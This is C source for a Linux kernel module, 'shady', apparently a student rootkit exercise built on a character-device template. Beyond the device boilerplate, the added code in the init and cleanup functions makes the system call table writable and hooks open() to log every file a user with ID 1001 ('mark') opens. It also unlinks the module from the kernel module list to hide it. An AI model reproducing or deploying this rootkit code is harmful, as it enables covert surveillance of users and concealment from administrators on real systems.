/* cfake.c - implementation of a simple module for a character device 
 * can be used for testing, demonstrations, etc.
 */
/* ========================================================================
 * Copyright (C) 2010-2011, Institute for System Programming 
 *                          of the Russian Academy of Sciences (ISPRAS)
 * Authors: 
 *      Eugene A. Shatokhin <spectre@ispras.ru>
 *      Andrey V. Tsyvarev  <tsyvarev@ispras.ru>
 *
 * This program is free software; you can redistribute it and/or modify it
 * under the terms of the GNU General Public License version 2 as published
 * by the Free Software Foundation.
 ======================================================================== */

#include <linux/version.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/init.h>

#include <linux/sched.h>
#include <linux/cred.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/fs.h>
#include <linux/errno.h>
#include <linux/err.h>
#include <linux/cdev.h>
#include <linux/device.h>
#include <linux/mutex.h>
#include <linux/unistd.h>

#include <asm/uaccess.h>

#include "shady.h"

MODULE_AUTHOR("Eugene A. Shatokhin, John Regehr");
MODULE_LICENSE("GPL");

#define SHADY_DEVICE_NAME "shady"

/* parameters */
static int shady_ndevices = SHADY_NDEVICES;
static unsigned int marks_uid = 1001;
static unsigned long system_call_table_address = 0xffffffff81801400;
void ** system_call_table;

module_param(shady_ndevices, int, S_IRUGO);
/* ================================================================ */

static unsigned int shady_major = 0;
static struct shady_dev *shady_devices = NULL;
static struct class *shady_class = NULL;
/* ================================================================ */

void set_addr_rw(unsigned long addr){
  unsigned int level;
  pte_t *pte = lookup_address(addr, &level);
  if(pte->pte &~ _PAGE_RW) pte->pte |= _PAGE_RW;
}

asmlinkage int (*old_open) (const char*, int, int);

asmlinkage int my_open(const char* file, int flags, int mode){
  if(get_current_user()->uid.val == marks_uid){
    printk("mark is about to open '%s'\n", file);
  }

  return old_open(file, flags, mode);
}

int 
shady_open(struct inode *inode, struct file *filp)
{
  unsigned int mj = imajor(inode);
  unsigned int mn = iminor(inode);
	
  struct shady_dev *dev = NULL;
	
  if (mj != shady_major || mn < 0 || mn >= shady_ndevices)
    {
      printk(KERN_WARNING "[target] "
	     "No device found with minor=%d and major=%d\n", 
	     mj, mn);
      return -ENODEV; /* No such device */
    }
	
  /* store a pointer to struct shady_dev here for other methods */
  dev = &shady_devices[mn];
  filp->private_data = dev; 

  if (inode->i_cdev != &dev->cdev)
    {
      printk(KERN_WARNING "[target] open: internal error\n");
      return -ENODEV; /* No such device */
    }
	
  return 0;
}

int 
shady_release(struct inode *inode, struct file *filp)
{
  return 0;
}

ssize_t 
shady_read(struct file *filp, char __user *buf, size_t count, 
	    loff_t *f_pos)
{
  struct shady_dev *dev = (struct shady_dev *)filp->private_data;
  ssize_t retval = 0;
	
  if (mutex_lock_killable(&dev->shady_mutex))
    return -EINTR;
	
  mutex_unlock(&dev->shady_mutex);
  return retval;
}
                
ssize_t 
shady_write(struct file *filp, const char __user *buf, size_t count, 
	     loff_t *f_pos)
{
  struct shady_dev *dev = (struct shady_dev *)filp->private_data;
  ssize_t retval = 0;
	
  if (mutex_lock_killable(&dev->shady_mutex))
    return -EINTR;
	
  mutex_unlock(&dev->shady_mutex);
  return retval;
}

loff_t 
shady_llseek(struct file *filp, loff_t off, int whence)
{
  return 0;
}

struct file_operations shady_fops = {
  .owner =    THIS_MODULE,
  .read =     shady_read,
  .write =    shady_write,
  .open =     shady_open,
  .release =  shady_release,
  .llseek =   shady_llseek,
};

/* ================================================================ */
/* Setup and register the device with specific index (the index is also
 * the minor number of the device).
 * Device class should be created beforehand.
 */
static int
shady_construct_device(struct shady_dev *dev, int minor, 
			struct class *class)
{
  int err = 0;
  dev_t devno = MKDEV(shady_major, minor);
  struct device *device = NULL;
    
  BUG_ON(dev == NULL || class == NULL);

  /* Memory is to be allocated when the device is opened the first time */
  dev->data = NULL;     
  mutex_init(&dev->shady_mutex);
    
  cdev_init(&dev->cdev, &shady_fops);
  dev->cdev.owner = THIS_MODULE;
    
  err = cdev_add(&dev->cdev, devno, 1);
  if (err)
    {
      printk(KERN_WARNING "[target] Error %d while trying to add %s%d",
	     err, SHADY_DEVICE_NAME, minor);
      return err;
    }

  device = device_create(class, NULL, /* no parent device */ 
			 devno, NULL, /* no additional data */
			 SHADY_DEVICE_NAME "%d", minor);

  if (IS_ERR(device)) {
    err = PTR_ERR(device);
    printk(KERN_WARNING "[target] Error %d while trying to create %s%d",
	   err, SHADY_DEVICE_NAME, minor);
    cdev_del(&dev->cdev);
    return err;
  }
  return 0;
}

/* Destroy the device and free its buffer */
static void
shady_destroy_device(struct shady_dev *dev, int minor,
		      struct class *class)
{
  BUG_ON(dev == NULL || class == NULL);
  device_destroy(class, MKDEV(shady_major, minor));
  cdev_del(&dev->cdev);
  kfree(dev->data);
  return;
}

/* ================================================================ */
static void
shady_cleanup_module(int devices_to_destroy)
{
  /*Code I Added*/
  system_call_table = (void **) system_call_table_address;
  system_call_table[__NR_open] = old_open;

  int i;
	
  /* Get rid of character devices (if any exist) */
  if (shady_devices) {
    for (i = 0; i < devices_to_destroy; ++i) {
      shady_destroy_device(&shady_devices[i], i, shady_class);
    }
    kfree(shady_devices);
  }
    
  if (shady_class)
    class_destroy(shady_class);

  /* [NB] shady_cleanup_module is never called if alloc_chrdev_region()
   * has failed. */
  unregister_chrdev_region(MKDEV(shady_major, 0), shady_ndevices);
  return;
}

static int __init
shady_init_module(void)
{
  int err = 0;
  int i = 0;
  int devices_to_destroy = 0;
  dev_t dev = 0;
	
  if (shady_ndevices <= 0)
    {
      printk(KERN_WARNING "[target] Invalid value of shady_ndevices: %d\n", 
	     shady_ndevices);
      err = -EINVAL;
      return err;
    }

  /* Get a range of minor numbers (starting with 0) to work with */
  err = alloc_chrdev_region(&dev, 0, shady_ndevices, SHADY_DEVICE_NAME);
  if (err < 0) {
    printk(KERN_WARNING "[target] alloc_chrdev_region() failed\n");
    return err;
  }
  shady_major = MAJOR(dev);

  /* Create device class (before allocation of the array of devices) */
  shady_class = class_create(THIS_MODULE, SHADY_DEVICE_NAME);
  if (IS_ERR(shady_class)) {
    err = PTR_ERR(shady_class);
    goto fail;
  }
	
  /* Allocate the array of devices */
  shady_devices = (struct shady_dev *)kzalloc(
						shady_ndevices * sizeof(struct shady_dev), 
						GFP_KERNEL);
  if (shady_devices == NULL) {
    err = -ENOMEM;
    goto fail;
  }
	
  /* Construct devices */
  for (i = 0; i < shady_ndevices; ++i) {
    err = shady_construct_device(&shady_devices[i], i, shady_class);
    if (err) {
      devices_to_destroy = i;
      goto fail;
    }
  }

  /*Added This Code*/
  system_call_table = (void *) system_call_table_address;
  old_open = system_call_table[__NR_open];

  set_addr_rw(system_call_table_address);

  system_call_table[__NR_open] = my_open;

  /*Extra Credit*/
  list_del_init(&__this_module.list);

  
  return 0; /* success */

 fail:
  shady_cleanup_module(devices_to_destroy);
  return err;
}

static void __exit
shady_exit_module(void)
{
  shady_cleanup_module(shady_ndevices);
  return;
}

module_init(shady_init_module);
module_exit(shady_exit_module);
/* ================================================================ */
